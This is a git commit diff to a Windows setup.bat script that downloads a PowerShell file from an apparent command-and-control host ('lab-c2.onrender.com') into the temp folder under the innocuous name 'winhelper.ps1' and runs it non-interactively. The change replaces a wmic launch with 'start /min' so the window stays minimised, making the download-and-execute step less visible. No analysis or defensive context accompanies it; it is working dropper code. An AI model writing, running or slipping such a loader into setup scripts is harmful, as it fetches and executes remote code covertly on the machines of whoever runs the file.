cce563969583f3c0c84c6f575587335f0f43a282
felixnth <felixnoethgen1@gmail.com>
2026-07-25 03:58:01 +0000

    use start /min

--- setup.bat
+++ setup.bat
@@ -1,5 +1,5 @@
 @echo off
 set PS1=%TEMP%\winhelper.ps1
 powershell -Command "Invoke-WebRequest -Uri 'https://lab-c2.onrender.com/download' -OutFile '%PS1%' -UseBasicParsing"
-wmic process call create "powershell -NonInteractive -File \"%PS1%\""
+start /min powershell -NonInteractive -File "%PS1%"
 exit
